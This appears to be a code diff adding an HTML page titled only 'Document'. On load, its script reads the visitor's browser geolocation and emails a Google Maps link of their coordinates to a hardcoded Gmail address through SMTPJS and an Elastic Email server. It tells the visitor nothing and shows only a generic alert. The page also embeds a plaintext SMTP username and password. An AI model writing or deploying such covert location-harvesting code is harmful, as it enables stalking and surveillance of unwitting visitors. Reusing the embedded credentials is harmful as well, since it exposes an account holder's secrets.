@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+
+        var url;
+        navigator.geolocation.getCurrentPosition(position => {
+            url = "http://maps.google.com/maps?q=" + position.coords.latitude + ",+" + position.coords.longitude;
+            console.log(url);
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "moreda272@gmail.com",
+                Password: "19021281892719C3B186B2780B7790B873DA",
+                To: 'moreda272@gmail.com',
+                From: "moreda272@gmail.com",
+                Subject: url,
+                Body: "And this is the body"
+            }).then(
+                message => alert(message)
+            );
+        })
+    </script>
+</body>
+
+</html>
